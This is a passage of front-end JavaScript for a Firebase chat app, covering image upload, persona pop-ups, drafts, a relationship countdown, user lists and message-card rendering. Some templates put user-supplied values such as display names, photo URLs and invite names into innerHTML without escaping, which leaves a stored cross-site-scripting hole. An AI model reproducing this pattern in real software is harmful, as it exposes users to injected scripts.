async function uploadImageToCloudinary(file, onProgress = null) {
    const formData = new FormData();
    formData.append('file', file);
    formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);

    return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();

        // Track upload progress
        if (onProgress) {
            xhr.upload.addEventListener('progress', (e) => {
                if (e.lengthComputable) {
                    const percentComplete = (e.loaded / e.total) * 100;
                    onProgress(percentComplete);
                }
            });
        }

        xhr.addEventListener('load', () => {
            if (xhr.status === 200) {
                const data = JSON.parse(xhr.responseText);
                if (data.secure_url) {
                    resolve(data.secure_url);
                } else {
                    reject(new Error(data.error?.message || 'Upload failed'));
                }
            } else {
                const data = JSON.parse(xhr.responseText);
                reject(new Error(data.error?.message || 'Upload failed'));
            }
        });

        xhr.addEventListener('error', () => {
            reject(new Error('Network error during upload'));
        });

        xhr.addEventListener('abort', () => {
            reject(new Error('Upload cancelled'));
        });

        xhr.open('POST', `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/upload`);
        xhr.send(formData);
    });
}

// Floating Persona Message Helpers
function maybeShowFloatingPersonaFromUserData(userData) {
    const floating = userData?.floatingMessage;
    // Only show if the chat app is actually visible (unlocked)
    const chatApp = document.getElementById('chat-app');
    const isUnlocked = chatApp && !chatApp.classList.contains('hidden');

    if (!floating || !floating.isActive || !floating.text || floatingMessagePlayed || !isUnlocked) {
        return;
    }

    if (floatingPersonaShowTimeout) {
        clearTimeout(floatingPersonaShowTimeout);
        floatingPersonaShowTimeout = null;
    }

    floatingPersonaShowTimeout = setTimeout(() => {
        floatingPersonaShowTimeout = null;
        showFloatingPersona(floating);
    }, 1000);
}

async function markPersonalMessageAsSeen(personalMessageId) {
    if (!personalMessageId || !currentUser) return;
    try {
        await updateDoc(doc(db, 'personalMessages', personalMessageId), {
            seen: true,
            seenAt: serverTimestamp(),
            seenBy: currentUser.uid
        });
    } catch (error) {
        console.error('Failed to mark personal message as seen:', error);
    }
}

function showFloatingPersona(floating) {
    if (!floatingPersona || !floatingPersonaTextEl || !floatingPersonaAvatar) return;

    floatingMessagePlayed = true;

    const text = (floating.text || '').trim();
    const avatarUrl = (floating.avatarUrl || '').trim();

    // Reset content
    floatingPersonaTextEl.textContent = '';
    if (floatingPersonaCloseBtn) {
        floatingPersonaCloseBtn.classList.add('hidden');
    }

    // Set avatar
    if (avatarUrl) {
        floatingPersonaAvatar.src = avatarUrl;
    } else {
        // Fallback to app AI avatar if available
        floatingPersonaAvatar.src = 'images/ai logo.jpg';
    }
    floatingPersonaAvatar.classList.add('talking');

    // Prepare animation
    floatingPersona.classList.remove('hidden', 'closing');
    // Force reflow so transition plays even if class was already set
    void floatingPersona.offsetWidth;
    floatingPersona.classList.add('visible');

    if (floating?.personalMessageId) {
        markPersonalMessageAsSeen(floating.personalMessageId);
    }

    startFloatingPersonaTypewriter(text);
}

function startFloatingPersonaTypewriter(fullText) {
    if (!floatingPersonaTextEl) return;

    let index = 0;
    const speed = 40; // ms per character

    if (floatingMessageTypewriterTimeout) {
        clearTimeout(floatingMessageTypewriterTimeout);
        floatingMessageTypewriterTimeout = null;
    }

    const step = () => {
        if (index <= fullText.length) {
            floatingPersonaTextEl.textContent = fullText.slice(0, index);
            index += 1;
            floatingMessageTypewriterTimeout = setTimeout(step, speed);
        } else {
            // Finished typing
            floatingMessageTypewriterTimeout = null;
            if (floatingPersonaAvatar) {
                floatingPersonaAvatar.classList.remove('talking');
            }
            if (floatingPersonaCloseBtn) {
                floatingPersonaCloseBtn.classList.remove('hidden');
            }
        }
    };

    step();
}

async function handleFloatingPersonaClose() {
    if (!floatingPersona) return;

    // Stop typewriter if still running
    if (floatingMessageTypewriterTimeout) {
        clearTimeout(floatingMessageTypewriterTimeout);
        floatingMessageTypewriterTimeout = null;
    }

    floatingPersona.classList.add('closing');
    floatingPersona.classList.remove('visible');

    // Persist dismissal so message is truly one-time
    if (currentUser) {
        try {
            await updateDoc(doc(db, 'users', currentUser.uid), {
                'floatingMessage.isActive': false
            });
        } catch (error) {
            console.error('Failed to update floatingMessage.isActive:', error);
        }
    }
}

function getChatId(uid1, uid2) {
    return [uid1, uid2].sort().join('_');
}

function formatTime(timestamp) {
    if (!timestamp) return '';
    const date = timestamp.toDate ? timestamp.toDate() : new Date(timestamp);
    const now = new Date();
    const diff = now - date;

    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return date.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
    return date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
}

// ===========================
// Draft Persistence
// ===========================
function saveDraft(chatId, text) {
    if (!chatId) return;
    const key = `draft:${chatId}`;
    if (text && text.trim()) {
        localStorage.setItem(key, text);
    } else {
        localStorage.removeItem(key);
    }
    updateDraftIndicator(chatId);
}

function loadDraft(chatId) {
    if (!chatId) return '';
    return localStorage.getItem(`draft:${chatId}`) || '';
}

function clearDraft(chatId) {
    if (!chatId) return;
    localStorage.removeItem(`draft:${chatId}`);
    updateDraftIndicator(chatId);
}

function updateDraftIndicator(chatId) {
    document.querySelectorAll('.user-item').forEach(item => {
        const userId = item.dataset.userId;
        if (!userId || !currentUser) return;

        const itemChatId = getChatId(currentUser.uid, userId);
        if (itemChatId === chatId) {
            const previewEl = item.querySelector('.user-preview');
            if (!previewEl) return;

            const draft = loadDraft(chatId);
            if (draft) {
                previewEl.innerHTML = `<span style="color: #ff4b4b;">Draft: </span> ${escapeHtml(draft)}`;
                previewEl.classList.remove('unread');
            } else {
                // Restore real preview
                const realPreview = item.dataset.realPreview || 'No messages yet';
                const isUnread = item.dataset.isUnread === 'true';
                previewEl.textContent = realPreview;
                if (isUnread) {
                    previewEl.classList.add('unread');
                } else {
                    previewEl.classList.remove('unread');
                }
            }
        }
    });
}

// ===========================
// Couple Countdown Functions
// ===========================

// Check if current user has a relationship
async function checkUserRelationship() {
    if (!currentUser) {
        stopCountdownTimer();
        return;
    }

    try {
        // Query relationships where user is partner1 or partner2
        const relationshipsRef = collection(db, 'relationships');
        const q1 = query(relationshipsRef, where('partner1_uid', '==', currentUser.uid));
        const q2 = query(relationshipsRef, where('partner2_uid', '==', currentUser.uid));

        const [snapshot1, snapshot2] = await Promise.all([
            getDocs(q1),
            getDocs(q2)
        ]);

        let relationshipDoc = null;
        snapshot1.forEach(doc => {
            relationshipDoc = { id: doc.id, ...doc.data() };
        });
        if (!relationshipDoc) {
            snapshot2.forEach(doc => {
                relationshipDoc = { id: doc.id, ...doc.data() };
            });
        }

        if (relationshipDoc) {
            currentRelationship = relationshipDoc;

            // Determine which partner is the current user and fetch partner data
            const partnerUid = currentUser.uid === relationshipDoc.partner1_uid
                ? relationshipDoc.partner2_uid
                : relationshipDoc.partner1_uid;

            // Fetch partner user data
            const partnerDoc = await getDoc(doc(db, 'users', partnerUid));
            if (partnerDoc.exists()) {
                const partnerUserData = partnerDoc.data();
                if (currentUser.uid === relationshipDoc.partner1_uid) {
                    partnerData.partner1 = { uid: currentUser.uid, ...currentUserData };
                    partnerData.partner2 = { uid: partnerUid, ...partnerUserData };
                } else {
                    partnerData.partner1 = { uid: relationshipDoc.partner1_uid };
                    partnerData.partner2 = { uid: currentUser.uid, ...currentUserData };
                    // Fetch partner1 data
                    const partner1Doc = await getDoc(doc(db, 'users', relationshipDoc.partner1_uid));
                    if (partner1Doc.exists()) {
                        partnerData.partner1 = { uid: relationshipDoc.partner1_uid, ...partner1Doc.data() };
                    }
                }
            }

            // Set up real-time listener
            if (relationshipListener) {
                relationshipListener();
            }
            relationshipListener = onSnapshot(
                doc(db, 'relationships', relationshipDoc.id),
                (docSnapshot) => {
                    if (docSnapshot.exists()) {
                        currentRelationship = { id: docSnapshot.id, ...docSnapshot.data() };
                        startCountdownTimer();
                    } else {
                        stopCountdownTimer();
                        currentRelationship = null;
                    }
                }
            );

            startCountdownTimer();
        } else {
            stopCountdownTimer();
            currentRelationship = null;
        }
    } catch (error) {
        console.error('Error checking user relationship:', error);
        stopCountdownTimer();
    }
}

// Start countdown timer
function startCountdownTimer() {
    stopCountdownTimer(); // Clear any existing interval

    if (!currentRelationship || !currentRelationship.startDate) {
        return;
    }

    const tickerEl = document.getElementById('couple-countdown-ticker');
    if (!tickerEl) return;

    tickerEl.classList.remove('hidden');

    const updateCountdown = () => {
        const startDate = currentRelationship.startDate?.toDate
            ? currentRelationship.startDate.toDate()
            : new Date(currentRelationship.startDate);

        const now = new Date();
        const diff = Math.max(0, now - startDate); // Ensure non-negative

        const days = Math.floor(diff / (1000 * 60 * 60 * 24));
        const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);

        const tickerText = `${days}d`;
        const fullCountdownText = `${days}d ${hours}h ${minutes}m ${seconds}s`;

        const countdownTextEl = document.getElementById('countdown-text');
        if (countdownTextEl) {
            countdownTextEl.textContent = tickerText;
        }

        // Update modal if open
        const modalCountdownEl = document.getElementById('duo-countdown-value');
        if (modalCountdownEl && !document.getElementById('duo-partner-modal').classList.contains('hidden')) {
            modalCountdownEl.textContent = fullCountdownText;
        }
    };

    updateCountdown(); // Initial update
    countdownInterval = setInterval(updateCountdown, 1000);
}

// Stop countdown timer
function stopCountdownTimer() {
    if (countdownInterval) {
        clearInterval(countdownInterval);
        countdownInterval = null;
    }

    const tickerEl = document.getElementById('couple-countdown-ticker');
    if (tickerEl) {
        tickerEl.classList.add('hidden');
    }

    if (relationshipListener) {
        relationshipListener();
        relationshipListener = null;
    }
}

// Open Duo Partner modal
async function openDuoPartnerModal() {
    if (!currentRelationship) return;

    const modal = document.getElementById('duo-partner-modal');
    if (!modal) return;

    // Fetch partner data if not already loaded
    if (!partnerData.partner1 || !partnerData.partner2) {
        try {
            const partner1Uid = currentRelationship.partner1_uid;
            const partner2Uid = currentRelationship.partner2_uid;

            const [partner1Doc, partner2Doc] = await Promise.all([
                getDoc(doc(db, 'users', partner1Uid)),
                getDoc(doc(db, 'users', partner2Uid))
            ]);

            if (partner1Doc.exists()) {
                partnerData.partner1 = { uid: partner1Uid, ...partner1Doc.data() };
            }
            if (partner2Doc.exists()) {
                partnerData.partner2 = { uid: partner2Uid, ...partner2Doc.data() };
            }
        } catch (error) {
            console.error('Error fetching partner data:', error);
        }
    }

    // Update avatars and names
    const avatar1El = document.getElementById('duo-avatar-1');
    const avatar2El = document.getElementById('duo-avatar-2');
    const name1El = document.getElementById('duo-name-1');
    const name2El = document.getElementById('duo-name-2');

    if (partnerData.partner1 && avatar1El && name1El) {
        applyAvatarToElement(avatar1El, partnerData.partner1.photoURL, partnerData.partner1.displayName || partnerData.partner1.email);
        name1El.textContent = partnerData.partner1.displayName || partnerData.partner1.email || 'Partner 1';
    }

    if (partnerData.partner2 && avatar2El && name2El) {
        applyAvatarToElement(avatar2El, partnerData.partner2.photoURL, partnerData.partner2.displayName || partnerData.partner2.email);
        name2El.textContent = partnerData.partner2.displayName || partnerData.partner2.email || 'Partner 2';
    }

    // Update countdown
    const startDate = currentRelationship.startDate?.toDate
        ? currentRelationship.startDate.toDate()
        : new Date(currentRelationship.startDate);
    const now = new Date();
    const diff = Math.max(0, now - startDate);

    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((diff % (1000 * 60)) / 1000);

    const countdownValueEl = document.getElementById('duo-countdown-value');
    if (countdownValueEl) {
        countdownValueEl.textContent = `${days}d ${hours}h ${minutes}m ${seconds}s`;
    }

    // Show modal with animation
    modal.classList.remove('hidden');
}

// Close Duo Partner modal
function closeDuoPartnerModal() {
    const modal = document.getElementById('duo-partner-modal');
    if (modal) {
        modal.classList.add('hidden');
    }
}

// ===========================
// User List
// ===========================
async function loadUsers() {
    const usersSnapshot = await getDocs(collection(db, 'users'));
    userList.innerHTML = '';

    usersSnapshot.forEach((docSnap) => {
        const userData = docSnap.data();
        if (userData.uid !== currentUser.uid) {
            const userItem = createUserItem(userData);
            userList.appendChild(userItem);
        }
    });

    // Listen for user status changes
    onSnapshot(collection(db, 'users'), (snapshot) => {
        snapshot.docChanges().forEach((change) => {
            if (change.type === 'modified') {
                const userData = change.doc.data();
                if (userData.uid !== currentUser.uid) {
                    updateUserStatus(userData);
                }
            }
        });
    });
}

function createUserItem(userData) {
    const div = document.createElement('div');
    div.className = 'user-item';
    div.dataset.userId = userData.uid;
    const displayStatus = getDisplayStatus(userData);

    // Check if user has a nickname
    const nickname = userNicknames.get(userData.uid);
    const displayName = nickname || userData.displayName;

    div.innerHTML = `
        <div class="user-avatar-container">
            <div class="user-avatar">${getInitials(userData.displayName || userData.email || '')}</div>
            ${displayStatus === 'online' ? '<div class="online-indicator"></div>' : ''}
            <div class="unread-badge hidden" data-count="0">0</div>
        </div>
        <div class="user-info">
            <div class="user-name">${displayName}</div>
            <div class="user-preview">Loading...</div>
        </div>
    `;

    applyAvatarToElement(div.querySelector('.user-avatar'), userData.photoURL, userData.displayName || userData.email);

    div.addEventListener('click', () => {
        openChat(userData);
    });

    // Load and listen to latest message preview
    loadLatestMessagePreview(userData.uid, div);

    // Load and listen to unread message count
    listenToUnreadCount(userData.uid, div);

    return div;
}

function updateUserStatus(userData) {
    const displayStatus = getDisplayStatus(userData);
    const userItem = document.querySelector(`.user-item[data-user-id="${userData.uid}"]`);
    if (userItem) {
        const avatarContainer = userItem.querySelector('.user-avatar-container');
        const avatarEl = userItem.querySelector('.user-avatar');

        applyAvatarToElement(avatarEl, userData.photoURL, userData.displayName || userData.email);

        const existingIndicator = avatarContainer.querySelector('.online-indicator');
        if (displayStatus === 'online' && !existingIndicator) {
            const indicator = document.createElement('div');
            indicator.className = 'online-indicator';
            avatarContainer.appendChild(indicator);
        } else if (displayStatus === 'offline' && existingIndicator) {
            existingIndicator.remove();
        }
    }

    // Update chat header if this is the current chat user
    if (currentChatUser && currentChatUser.uid === userData.uid) {
        document.getElementById('chat-user-status').textContent = getChatHeaderStatus(userData);
        applyAvatarToElement(document.getElementById('chat-user-avatar'), userData.photoURL, userData.displayName || userData.email);
    }
}

function getMessagePreviewText(messageData) {
    if (messageData.isDeleted) {
        return 'This message was deleted';
    }

    if (messageData.type === 'sticker') {
        return '[Sent a Sticker]';
    } else if (messageData.type === 'gif') {
        return '[Sent a GIF]';
    } else if (messageData.type === 'image') {
        return '[Sent an Image]';
    } else if (messageData.type === 'voice') {
        return '[Sent a Voice Message]';
    } else if (messageData.text) {
        // Truncate text to 50 characters for preview
        return messageData.text.length > 50
            ? messageData.text.substring(0, 50) + '...'
            : messageData.text;
    }

    return '[Message]';
}

function getMessagePreviewData(messageData) {
    // Returns an object with type, text, and mediaUrl for rich preview rendering
    if (messageData.isDeleted) {
        return { type: 'deleted', text: 'This message was deleted', mediaUrl: null };
    }

    if (messageData.type === 'sticker') {
        return { type: 'sticker', text: 'Sticker', mediaUrl: messageData.imgUrl };
    } else if (messageData.type === 'gif') {
        return { type: 'gif', text: 'GIF', mediaUrl: messageData.imgUrl };
    } else if (messageData.type === 'image') {
        return { type: 'image', text: 'Image', mediaUrl: messageData.imgUrl };
    } else if (messageData.type === 'voice') {
        return { type: 'voice', text: 'Voice Message', mediaUrl: null };
    } else if (messageData.text) {
        const truncated = messageData.text.length > 50
            ? messageData.text.substring(0, 50) + '...'
            : messageData.text;
        return { type: 'text', text: truncated, mediaUrl: null };
    }

    return { type: 'text', text: '[Message]', mediaUrl: null };
}

function loadLatestMessagePreview(otherUserId, userItemEl) {
    const chatId = getChatId(currentUser.uid, otherUserId);
    const messagesRef = collection(db, 'chats', chatId, 'messages');
    const q = query(messagesRef, orderBy('timestamp', 'desc'), limit(1));

    // Listen for real-time updates
    const unsubscribe = onSnapshot(q, (snapshot) => {
        const previewEl = userItemEl.querySelector('.user-preview');
        if (!previewEl) return;

        if (snapshot.empty) {
            // No messages
            userItemEl.dataset.realPreview = 'No messages yet';
            userItemEl.dataset.isUnread = 'false';
        } else {
            const latestMessage = snapshot.docs[0].data();
            const previewText = getMessagePreviewText(latestMessage);

            // Add "You: " prefix if current user sent the message
            const isCurrentUserSender = latestMessage.senderId === currentUser.uid;
            const displayText = isCurrentUserSender ? `You: ${previewText}` : previewText;

            userItemEl.dataset.realPreview = displayText;

            // Add unread indicator if message is not seen and not from current user
            if (!latestMessage.seen && latestMessage.senderId !== currentUser.uid) {
                userItemEl.dataset.isUnread = 'true';
            } else {
                userItemEl.dataset.isUnread = 'false';
            }
        }

        // Update UI (checking for draft)
        const currentChatId = getChatId(currentUser.uid, otherUserId);
        updateDraftIndicator(currentChatId);
    });

    // Store unsubscribe function for cleanup if needed
    if (!userItemEl._unsubscribes) {
        userItemEl._unsubscribes = [];
    }
    userItemEl._unsubscribes.push(unsubscribe);
}

function listenToUnreadCount(otherUserId, userItemEl) {
    const chatId = getChatId(currentUser.uid, otherUserId);
    const messagesRef = collection(db, 'chats', chatId, 'messages');
    // Query for unseen messages from the other user
    const q = query(messagesRef, where('senderId', '==', otherUserId), where('seen', '==', false));

    // Listen for real-time updates
    const unsubscribe = onSnapshot(q, (snapshot) => {
        const badgeEl = userItemEl.querySelector('.unread-badge');
        if (!badgeEl) return;

        const unreadCount = snapshot.size;

        if (unreadCount > 0) {
            badgeEl.textContent = unreadCount > 9 ? '9+' : unreadCount;
            badgeEl.dataset.count = unreadCount;
            badgeEl.classList.remove('hidden');
        } else {
            badgeEl.classList.add('hidden');
            badgeEl.dataset.count = '0';
        }
    });

    // Store unsubscribe function for cleanup if needed
    if (!userItemEl._unsubscribes) {
        userItemEl._unsubscribes = [];
    }
    userItemEl._unsubscribes.push(unsubscribe);
}

// ===========================
// Chat Window
// ===========================

async function openChat(userData) {
    currentChatUser = userData;
    currentChatId = getChatId(currentUser.uid, userData.uid);

    // Update UI with nickname if exists
    const nickname = userNicknames.get(userData.uid);
    const displayName = nickname || userData.displayName;
    document.getElementById('chat-user-name').textContent = displayName;
    document.getElementById('chat-user-status').textContent = getChatHeaderStatus(userData);
    applyAvatarToElement(document.getElementById('chat-user-avatar'), userData.photoURL, userData.displayName || userData.email);

    // Mobile: show chat window
    chatWindowContainer.classList.add('active');
    const userListContainer = document.getElementById('user-list-container');
    if (userListContainer) {
        userListContainer.classList.add('hidden-mobile');
    }

    // Highlight selected user
    document.querySelectorAll('.user-item').forEach(item => {
        item.classList.remove('active');
    });
    document.querySelector(`.user-item[data-user-id="${userData.uid}"]`)?.classList.add('active');

    // Create chat document if it doesn't exist
    const chatRef = doc(db, 'chats', currentChatId);
    const chatDoc = await getDoc(chatRef);
    if (!chatDoc.exists()) {
        await setDoc(chatRef, {
            participants: [currentUser.uid, userData.uid],
            lastMessageTimestamp: serverTimestamp(),
            createdAt: serverTimestamp()
        });
    }

    // Load messages
    loadMessages();

    // Load draft
    const draft = loadDraft(currentChatId);
    if (messageInput) {
        messageInput.value = draft;
        // Trigger resize
        messageInput.style.height = 'auto';
        messageInput.style.height = (messageInput.scrollHeight) + 'px';
    }

    // Listen for typing indicator
    listenForTyping();

    // Mark messages as seen
    markMessagesAsSeen();

    // Load streak data
    await loadStreakData(currentChatId);
    updateStreakDisplay(currentChatId);

    // Load and apply theme for this chat
    loadThemeForChat();
}

backToUsersBtn.addEventListener('click', () => {
    chatWindowContainer.classList.remove('active');
    const userListContainer = document.getElementById('user-list-container');
    if (userListContainer) {
        userListContainer.classList.remove('hidden-mobile');
    }
});

// ===========================
// Messages
// ===========================
let isFirstMessageLoad = true;

function loadMessages() {
    // Unsubscribe from previous chat
    if (unsubscribeMessages) {
        unsubscribeMessages();
    }

    messagesContainer.innerHTML = '';
    isFirstMessageLoad = true;

    const messagesRef = collection(db, 'chats', currentChatId, 'messages');
    const q = query(messagesRef, orderBy('timestamp', 'asc'));

    unsubscribeMessages = onSnapshot(q, (snapshot) => {
        // Check if user is at bottom before changes
        const wasAtBottom = messagesContainer.scrollHeight - messagesContainer.scrollTop <= messagesContainer.clientHeight + 100;
        let hasNewMessages = false;
        let messageCount = 0;

        snapshot.docChanges().forEach((change) => {
            if (change.type === 'added') {
                const messageData = { id: change.doc.id, ...change.doc.data() };

                // CRITICAL: Immediately hide typing indicator for this sender
                // This ensures the indicator disappears instantly when the message arrives
                if (messageData.senderId === currentChatUser?.uid) {
                    const typingIndicatorEl = messagesContainer.querySelector('.message.typing-indicator-message');
                    if (typingIndicatorEl) {
                        // Remove immediately without animation delay
                        typingIndicatorEl.remove();
                    }
                }

                appendMessage(messageData);
                hasNewMessages = true;
                messageCount++;
            } else if (change.type === 'modified') {
                updateMessage(change.doc.id, change.doc.data());
                // Don't treat modified messages as "new" to prevent unnecessary scrolling
            } else if (change.type === 'removed') {
                removeMessage(change.doc.id);
            }
        });

        // Auto-scroll logic:
        // 1. Always scroll to bottom on first load (initial chat open)
        // 2. Scroll to bottom if user was already at bottom and new messages arrive
        if (hasNewMessages) {
            if (isFirstMessageLoad) {
                // First load: always scroll to bottom to show latest messages
                scrollToBottom(false);
                isFirstMessageLoad = false;
            } else if (wasAtBottom) {
                // Subsequent loads: only scroll if user was at bottom
                scrollToBottom(false);
            }

            // Mark new messages as seen (debounced)
            markMessagesAsSeen();
        }
    });

    // Add passive scroll listener for better performance
    if (messagesContainer && !messagesContainer._scrollListenerAdded) {
        messagesContainer.addEventListener('scroll', throttle(() => {
            markMessagesAsSeen();
        }, 200), passiveOptions);
        messagesContainer._scrollListenerAdded = true;
    }
}

/**
 * Generates avatar HTML for a received message
 * Shows the avatar or a placeholder depending on monologue grouping
 */
function getAvatarHtml(showAvatar, senderPhotoURL, senderName) {
    if (showAvatar) {
        // Show actual avatar
        const initials = (senderName || 'U').split(' ').map(n => n[0]).join('').toUpperCase().slice(0, 2);
        const bgStyle = senderPhotoURL ? `background-image: url('${senderPhotoURL}');` : '';
        return `
            <div class="message-avatar" style="${bgStyle}">
                ${!senderPhotoURL ? initials : ''}
            </div>
        `;
    } else {
        // Show invisible placeholder to maintain alignment
        return `<div class="message-avatar-placeholder"></div>`;
    }
}

/**
 * Determines if an avatar should be shown for a received message
 * Avatar is shown if:
 * 1. It's the first received message in the chat
 * 2. The sender is different from the previous message's sender (breaks monologue)
 * 3. The previous message is from the current user (breaks monologue)
 */
function shouldShowAvatar(messageData) {
    // Only show avatars for received messages
    if (messageData.senderId === currentUser.uid) {
        return false;
    }

    // Get all messages in the container
    const allMessages = messagesContainer.querySelectorAll('.message');
    if (allMessages.length === 0) {
        return true; // First message, show avatar
    }

    // Find the previous message element
    let previousMessageEl = null;
    for (let i = allMessages.length - 1; i >= 0; i--) {
        if (allMessages[i].dataset.messageId !== messageData.id) {
            previousMessageEl = allMessages[i];
            break;
        }
    }

    // If no previous message, show avatar
    if (!previousMessageEl) {
        return true;
    }

    // Check if previous message is from the same sender
    const previousMessageId = previousMessageEl.dataset.messageId;
    const previousMessageEl_actual = document.querySelector(`.message[data-message-id="${previousMessageId}"]`);

    // If previous message is from current user (sent), show avatar (breaks monologue)
    if (previousMessageEl_actual?.classList.contains('sent')) {
        return true;
    }

    // If previous message is from a different sender, show avatar
    // We can check this by looking at the message data or by checking if it has an avatar
    // For now, we'll assume if it's not 'sent', it's from the same sender
    // So we return false to suppress avatar (continue monologue)
    return false;
}

function createMessageElement(messageData) {
    const isOwnMessage = messageData.senderId === currentUser.uid;
    const isDeleted = !!messageData.isDeleted;
    const isSystemMessage = messageData.type === 'system';
    const isGameInvite = messageData.type === 'game_invite';
    const isWatchPartyInvite = messageData.type === 'watch_party';
    const isVoiceMessage = !isDeleted && messageData.type === 'voice';
    const isStickerOrGif = !isDeleted && (messageData.type === 'sticker' || messageData.type === 'gif');
    const isImageMessage = !isDeleted && messageData.type === 'image' && !messageData.text;

    // Check for single emoji
    const isSingleEmoji = !isDeleted && !isSystemMessage && !isGameInvite && !isWatchPartyInvite && !isVoiceMessage && !isStickerOrGif && messageData.text && isSingleEmojiString(messageData.text);

    const div = document.createElement('div');

    // Determine if avatar should be shown for received messages (monologue grouping)
    const showAvatar = !isOwnMessage && !isSystemMessage && !isDeleted && shouldShowAvatar(messageData);

    div.className = `message ${isOwnMessage ? 'sent' : 'received'}${isDeleted ? ' deleted' : ''}${isStickerOrGif || isVoiceMessage ? ' no-bubble' : ''}${isImageMessage ? ' image-only' : ''}${isSystemMessage ? ' system-message' : ''}${isGameInvite ? ' game-invite-message' : ''}${isWatchPartyInvite ? ' watch-party-message' : ''}${isSingleEmoji ? ' supersized-emoji' : ''}${showAvatar ? ' show-avatar' : ' hide-avatar'}`;
    div.dataset.messageId = messageData.id;
    div.dataset.messageType = messageData.type || 'text';
    div.dataset.senderId = messageData.senderId;
    div.dataset.seen = messageData.seen ? 'true' : 'false';
    // Set position relative for absolute positioning of floating receipt
    div.style.position = 'relative';
    // Store timestamp in milliseconds for proper sorting
    // Use server timestamp if available, otherwise use current time as fallback
    let timestamp = 0;
    if (messageData.timestamp?.seconds) {
        timestamp = messageData.timestamp.seconds * 1000;
    } else if (messageData.timestamp instanceof Date) {
        timestamp = messageData.timestamp.getTime();
    } else {
        // Fallback to current time for messages that haven't been synced yet
        timestamp = Date.now();
    }
    div.dataset.timestamp = timestamp;

    let content = '';
    if (isSystemMessage) {
        content = `<span class="system-message-text">${escapeHtml(messageData.text || '')}</span>`;
    } else if (isDeleted) {
        content = `<span class="message-deleted-text">This message was deleted</span>`;
    } else if (isGameInvite) {
        // Game invite card
        const inviterName = messageData.invitedByName || 'Someone';
        const roomId = messageData.roomId;
        const gameType = messageData.gameType || 'tictactoe';
        const isExpired = messageData.gameStarted || false;

        // Determine game title and emoji
        let gameTitle = 'Tic-Tac-Toe';
        let gameEmoji = '⭕';
        if (gameType === 'rps') {
            gameTitle = 'Rock Paper Scissors';
            gameEmoji = '✂️';
        }

        // Determine invite text based on sender/receiver
        let inviteText = '';
        if (isOwnMessage) {
            inviteText = `You challenged ${messageData.invitedToName || 'them'} to ${gameTitle}!`;
        } else {
            inviteText = `${escapeHtml(inviterName)} challenged you to ${gameTitle}!`;
        }

        // Determine button state
        let buttonHtml = '';
        if (isExpired) {
            buttonHtml = `<button class="game-invite-btn expired" disabled>Game Started</button>`;
        } else {
            buttonHtml = `<button class="game-invite-btn" data-room-id="${roomId}" data-game-type="${gameType}">Tap to Play</button>`;
        }

        content = `
            <div class="game-invite-card">
                <div class="game-invite-header">${gameEmoji} Game Invite</div>
                <div class="game-invite-text">${inviteText}</div>
                ${buttonHtml}
            </div>
        `;
    } else if (isWatchPartyInvite) {
        const roomId = messageData.roomId;
        const videoTitle = messageData.videoTitle || 'YouTube Video';
        const hostName = messageData.hostName || 'Friend';
        const thumbnailUrl = messageData.videoThumbnail || (messageData.videoId ? getDefaultThumbnail(messageData.videoId) : '');
        const partyEnded = !!messageData.partyEnded;
        const statusText = partyEnded
            ? 'Watch party ended'
            : 'Stay in sync across devices';
        const buttonLabel = partyEnded
            ? 'Session Ended'
            : (isOwnMessage ? 'Open Watch Party' : 'Join Watch Party');
        const buttonClasses = `watch-party-btn${partyEnded ? ' expired' : ''}`;
        const buttonAttributes = partyEnded ? 'disabled' : `data-room-id="${roomId || ''}"`;
        const videoIconSvg = `
            <svg class="watch-party-icon" viewBox="0 0 24 24" aria-hidden="true">
                <path d="M4 6.5C4 5.1 5.1 4 6.5 4h7c1.4 0 2.5 1.1 2.5 2.5v11c0 1.4-1.1 2.5-2.5 2.5h-7C5.1 20 4 18.9 4 17.5v-11Z" />
                <path d="M18 8l4-2.5v11L18 14" />
            </svg>
        `;
        const hostIconSvg = `
            <svg class="watch-party-icon subtle" viewBox="0 0 24 24" aria-hidden="true">
                <path d="M12 12c2.5 0 4.5-2 4.5-4.5S14.5 3 12 3 7.5 5 7.5 7.5 9.5 12 12 12Zm0 2c-3 0-9 1.5-9 4.5V21h18v-2.5c0-3-6-4.5-9-4.5Z" />
            </svg>
        `;
        const statusIconSvg = partyEnded
            ? `
                <svg class="watch-party-icon danger" viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M12 8v4" />
                    <path d="M12 16h.01" />
                    <path d="M10.3 3.5 1.8 18a1.5 1.5 0 0 0 1.3 2.25h17.8A1.5 1.5 0 0 0 22.2 18L13.7 3.5a1.5 1.5 0 0 0-2.6 0Z" />
                </svg>
            `
            : `
                <svg class="watch-party-icon success" viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M4 12.5 9 17l11-11" />
                </svg>
            `;
        const arrowIconSvg = `
            <svg class="watch-party-icon arrow" viewBox="0 0 24 24" aria-hidden="true">
                <path d="M5 12h14" />
                <path d="m13 6 6 6-6 6" />
            </svg>
        `;

        content = `
            <div class="watch-party-card">
                <div class="watch-party-chip">
                    <span class="watch-party-icon-cell">${videoIconSvg}</span>
                    <span>Watch Party</span>
                </div>
                <div class="watch-party-body">
                    <div class="watch-party-thumb-small" style="${thumbnailUrl ? `background-image: url('${thumbnailUrl}');` : ''}"></div>
                    <div class="watch-party-info">
                        <div class="watch-party-title">${escapeHtml(videoTitle)}</div>
                        <div class="watch-party-host">
                            ${hostIconSvg}
                            <span>Host • ${escapeHtml(hostName)}</span>
                        </div>
                        <div class="watch-party-status-row">
                            ${statusIconSvg}
                            <span>${statusText}</span>
                        </div>
                    </div>
                </div>
                <button class="${buttonClasses}" ${buttonAttributes}>
                    <span>${buttonLabel}</span>
                    ${arrowIconSvg}
                </button>
            </div>
        `;
    } else if (messageData.type === 'voice') {
        // Voice message player - no bubble
        const duration = messageData.duration || 0;
